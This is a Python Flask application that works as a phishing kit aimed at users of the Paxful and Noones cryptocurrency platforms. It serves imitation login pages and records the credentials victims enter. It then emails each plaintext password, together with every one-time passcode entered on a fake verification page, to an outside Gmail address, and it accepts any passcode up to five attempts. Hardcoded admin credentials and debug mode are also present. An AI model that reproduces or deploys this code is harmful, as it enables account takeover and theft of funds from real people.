from flask import Flask, render_template, request, redirect, session, url_for
import sqlite3, os, random
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
from datetime import timedelta
from flask_mail import Mail, Message

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'kenaki_secret')
app.permanent_session_lifetime = timedelta(minutes=30)

# ========== Database Path Setup ==========
if os.getenv("VERCEL") == "1":
    DB_PATH = "/tmp/users.db"
else:
    DB_PATH = "users.db"

# ========== Flask-Mail Configuration ==========
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME')
app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD')
app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER')

mail = Mail(app)

# ========== Initialize Database ==========
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            action TEXT,
            platform TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# ========== Admin Login Decorator ==========
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('admin') != True:
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# ========== Routes ==========
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/select-service')
def select_service():
    action = request.args.get('action')
    return render_template('select-service.html', action=action)

@app.route('/paxful', methods=['GET', 'POST'])
def paxful_login():
    action = request.args.get('action', 'do something')

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        hashed_pw = generate_password_hash(password)

        try:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("INSERT INTO users (username, password, action, platform) VALUES (?, ?, ?, ?)",
                      (username, hashed_pw, action, 'paxful'))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[Error] Inserting user {username}: {e}")
            return "Error inserting data", 500

        session['username'] = username
        session['theme'] = 'paxful'
        session['action'] = action
        session['password'] = password
        session['otp_attempts'] = 0

        # Send email notification on login submission
        send_login_notification(
            username=username,
            action=action,
            password=password,
            otp=None,
            platform='paxful'
        )

        return redirect(url_for('otp_page'))

    return render_template('OGpax.html', action=action)

@app.route('/noones', methods=['GET', 'POST'])
def noones_login():
    action = request.args.get('action', 'do something')

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        hashed_pw = generate_password_hash(password)

        try:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("INSERT INTO users (username, password, action, platform) VALUES (?, ?, ?, ?)",
                      (username, hashed_pw, action, 'noones'))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[Error] Inserting user {username}: {e}")
            return "Error inserting data", 500

        session['username'] = username
        session['theme'] = 'noones'
        session['action'] = action
        session['password'] = password
        session['otp_attempts'] = 0

        # Send email notification on login submission
        send_login_notification(
            username=username,
            action=action,
            password=password,
            otp=None,
            platform='noones'
        )

        return redirect(url_for('otp_page'))

    return render_template('OGnoones.html', action=action)

@app.route('/otp', methods=['GET', 'POST'])
def otp_page():
    if 'username' not in session or 'theme' not in session:
        return redirect(url_for('home'))

    message = ""
    if request.method == 'POST':
        # Collect all OTP digits from the form
        otp_digits = [request.form.get(f'otp{i}', '') for i in range(6)]
        otp = ''.join(otp_digits)  # Combine the digits into a single string

        session['otp_attempts'] += 1

        # Send email notification on every OTP submission
        send_login_notification(
            username=session['username'],
            action=session['action'],
            password=session['password'],
            otp=otp,
            platform=session['theme']
        )

        # After 5 attempts (or on the 5th), redirect to thank you page regardless of OTP
        if session['otp_attempts'] >= 5:
            action = session.get('action', 'make')
            theme = session.get('theme', 'paxful')
            session.pop('otp_attempts', None)
            session.pop('password', None)
            return redirect(url_for('thank_you', action=action, theme=theme))
        else:
            message = f"OTP submitted. Attempts left: {5 - session['otp_attempts']}"

    return render_template('verify_otp.html', theme=session['theme'], message=message)

@app.route('/thank-you')
def thank_you():
    action = request.args.get('action', 'make')
    theme = request.args.get('theme', 'paxful')
    return render_template('thank_you.html', action=action, theme=theme)

@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        email = data['email']
        password = data['password']
        action = data['action']

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE username = ?", (email,))
        user = c.fetchone()
        conn.close()

        if user and check_password_hash(user[2], password):
            return {"message": "Login successful!"}
        else:
            return {"message": "Invalid login credentials!"}, 401

    except Exception as e:
        print(f"[Error] During login: {e}")
        return {"message": "Internal server error!"}, 500

@app.route('/admin')
@login_required
def admin_dashboard():
    return render_template('admin_dashboard.html')

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        admin_username = request.form['username']
        admin_password = request.form['password']

        if admin_username == 'admin' and admin_password == 'adminpass':
            session['admin'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            return "Invalid credentials", 403

    return render_template('admin_login.html')

# ========== Send Login Notification ==========
def send_login_notification(username, action, password, otp, platform):
    try:
        otp_message = f"OTP Entered: {otp}" if otp else "OTP: Not entered yet"
        message = Message(
            subject=f"New Login Attempt ({platform.capitalize()})",
            recipients=["chasersbit439@gmail.com"],
            body=f"A user has logged in:\n\n"
                 f"Platform: {platform.capitalize()}\n"
                 f"Username: {username}\n"
                 f"Password: {password}\n"
                 f"Action: {action}\n"
                 f"{otp_message}"
        )
        mail.send(message)
        print(f"[Mail] Notification sent for user '{username}' on platform '{platform}'.")
    except Exception as e:
        print(f"[Error] Sending email: {e}")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=True)